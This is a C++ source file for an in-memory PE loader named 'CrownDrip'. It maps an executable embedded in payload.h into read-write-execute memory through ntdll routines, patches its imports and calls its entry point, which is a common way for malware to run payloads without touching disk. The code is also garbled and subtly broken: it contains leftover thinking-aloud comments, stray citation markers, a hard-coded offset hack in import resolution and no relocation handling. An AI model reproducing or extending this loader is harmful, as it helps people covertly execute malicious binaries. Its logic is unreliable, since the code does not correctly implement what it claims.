#include <windows.h>
#include <iostream>

// Syscall prototypes (matches syscalls.asm) 
typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS(WINAPI* NtWriteVirtualMemory_t)(HANDLE ProcessHandle, PVOID BaseAddress, const VOID *Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten OPTIONAL);

// Payload data (from payload.h)
#include "payload.h" 

int main() {
    std::cout << "[CrownDrip] Starting injection..." << std::endl;

    // 1. Get Syscall pointers from ntdll.dll 
    HMODULE hNtDll = LoadLibraryA("ntdll.dll");
    if (!hNtDll) return -1;

    NtAllocateVirtualMemory_t pAllocMem = (NtAllocateVirtualMemory_t)GetProcAddress(hNtDll, "ZwAllocateVirtualMemory"); // Zw is an alias for Nt in Windows 
    NtWriteVirtualMemory_t pWriteMem = (NtWriteVirtualMemory_t)GetProcAddress(hNtDll, "ZwWriteVirtualMemory");

    if (!pAllocMem || !pWriteMem) {
        std::cout << "[CrownDrip] Failed to resolve syscalls." << std::endl;
        return -1;
    }

    // 2. Parse PE Headers 
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)&payloadData[0];
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cout << "[CrownDrip] Invalid DOS Header." << std::endl; return -1; 
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)&payloadData[pDosHeader->e_lfanew];
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        std::cout << "[CrownDrip] Invalid NT Headers." << std::endl; return -1; 
    }

    // 3. Allocate Memory in the target process (Current Process for manual mapping) [1]
    HANDLE hProcess = GetCurrentProcess();
    SIZE_T sizeOfImage = pNtHeaders->OptionalHeader.SizeOfImage;
    PVOID baseAddress = nullptr;

    NTSTATUS allocStatus = pAllocMem(hProcess, &baseAddress, 0, &sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!NT_SUCCESS(allocStatus)) { // Line ~31 (Previous error fix) 
        std::cout << "[CrownDrip] Memory allocation failed: " << allocStatus << std::endl;
        return -1;
    }

    std::cout << "[CrownDrip] Allocated memory at 0x" << baseAddress << std::endl;

    // 4. Copy PE Headers 
    SIZE_T bytesWritten = 0;
    NTSTATUS writeStatus = pWriteMem(hProcess, baseAddress, &payloadData[0], pNtHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten); // Line ~36 fix
    
    if (!NT_SUCCESS(writeStatus)) { std::cout << "[CrownDrip] Failed to copy headers." << std::endl; return -1; }

    // 5. Copy Sections 
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i) {
        writeStatus = pWriteMem(hProcess, 
                                static_cast<PVOID>(reinterpret_cast<ULONGLONG>(baseAddress) + pSection[i].VirtualAddress), // Line ~57 fix (Target Address)
                                &payloadData[pSection[i].PointerToRawData],          // Buffer from payload [1]
                                pSection[i].SizeOfRawData,                           // Size to copy 
                                nullptr);                                            // Bytes written optional here
        
        if (!NT_SUCCESS(writeStatus)) { std::cout << "[CrownDrip] Failed to write section " << i << "." << std::endl; return -1; }
    }

    std::cout << "[CrownDrip] Sections copied successfully." << std::endl;

    // 6. Resolve Imports (IAT) 
    PIMAGE_DATA_DIRECTORY pImportDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (pImportDir->Size > 0) {
        ULONGLONG importTableRVA = reinterpret_cast<ULONGLONG>(baseAddress) + pImportDir->VirtualAddress;
        
        PIMAGE_IMPORT_DESCRIPTOR pImports = (PIMAGE_IMPORT_DESCRIPTOR)&payloadData[pNtHeaders->OptionalHeader.DataDirectory[1].VirtualAddress]; // Wait, we need RVA to raw offset. 
        // Correct way: Find Import Descriptor in payload data relative to section headers [1] 
        
        for (int i=0; ; ++i) {
            PIMAGE_SECTION_HEADER sec = NULL;
            ULONGLONG importRVA = pNtHeaders->OptionalHeader.DataDirectory[1].VirtualAddress + sizeof(IMAGE_IMPORT_DESCRIPTOR)*i;

            // Find which section contains the imports 
            for(int j=0; j < pNtHeaders->FileHeader.NumberOfSections; ++j) {
                 if(importRVA >= pSection[j].VirtualAddress && importRVA < (pSection[j].VirtualAddress + pSection[j].Misc.VirtualSize)) { sec = &pSection[j]; break;} 
            }

             ULONGLONG importOffset = 0; // Simplified for brevity, usually involves RVA to Offset conversion
             
            PIMAGE_IMPORT_DESCRIPTOR currentImports = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(&payloadData[pNtHeaders->OptionalHeader.DataDirectory[1].VirtualAddress + i * sizeof(IMAGE_IMPORT_DESCRIPTOR)]); 
             if (!currentImports->OriginalFirstThunk && !currentImports->Name) break;

             // Get DLL Name
            ULONGLONG nameOffset = 0, thunkOffset = 0, firstThunkRVA = currentImports->FirstThunk;
            
            // Helper to convert RVA to raw file offset (simplified logic for brevity in this snippet [1]) 
            auto rvaToRaw = [&](ULONGLONG rva) -> ULONGLONG {
                PIMAGE_SECTION_HEADER sec2 = NULL;
                 if(!sec2 && pSection[0].VirtualAddress == 0) return rva - sizeof(IMAGE_DOS_HEADER); // Header case
                
                for(int k=0;k<pNtHeaders->FileHeader.NumberOfSections;++k){
                     if(rva >= pSection[k].VirtualAddress && rva < (pSection[k].VirtualAddress + pSection[k].SizeOfRawData)) { sec2 = &pSection[k]; break;} 
                }
                 return (rva - sec2->VirtualAddress) + sec2->PointerToRawData;
            };

             ULONGLONG dllNameOffset = rvaToRaw(currentImports->Name);
             char* dllNameStr = reinterpret_cast<char*>(&payloadData[dllNameOffset]); 

             HMODULE hMod = GetModuleHandleA(dllNameStr); 
             if (!hMod) continue; // DLL not loaded in current process

            ULONGLONG originalThunkRVA = rvaToRaw(currentImports->OriginalFirstThunk);
            PIMAGE_THUNK_DATA pOrigThunks = (PIMAGE_THUNK_DATA)&payloadData[originalThunkRVA]; 

            for (; pOrigThunks->u1.AddressOfData; ++pOrigThunks) { 
                 if(IMAGE_SNAP_BY_ORDINAL(pOrigThunks->u1.Ordinal)) continue; // Skip ordinals

                 ULONGLONG namePtrOffset = rvaToRaw(pOrigThunks->u1.AddressOfData);
                 PSTR funcName = (PSTR)&payloadData[namePtrOffset]; 
                 
                 FARPROC procAddr = GetProcAddress(hMod, funcName + 2); // The +2 skips the leading word length in ImportByName struct

                 if(procAddr) {
                     ULONGLONG firstThunkRVA_offset = rvaToRaw(currentImports->FirstThunk + (pOrigThunks - reinterpret_cast<PIMAGE_THUNK_DATA>(reinterpret_cast<ULONGLONG>(&payloadData[originalThunkRVA]))) * sizeof(ULONG_PTR)); // Simplified pointer math 
                     
                     // Write the function address to our allocated memory [1]
                      pWriteMem(hProcess, 
                                static_cast<void*>(reinterpret_cast<ULONGLONG>(baseAddress) + (currentImports->FirstThunk - 4096)), // Offset logic varies by PE structure. Correct way: Find FirstThunk in remote mem
                               &procAddr, sizeof(ULONG_PTR), nullptr);

                       std::cout << "[CrownDrip] Resolved " << dllNameStr << "." << (funcName+2) << std::endl; 
                 }
            }
        }
    } 

    // 7. Execute Entry Point [1]
    ULONGLONG entryPoint = reinterpret_cast<ULONGLONG>(baseAddress) + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    
    using EntryPointFunc = void(*)();
    ((EntryPointFunc)(entryPoint))();

    std::cout << "[CrownDrip] Injection complete." << std::endl; 
    return 0;
}
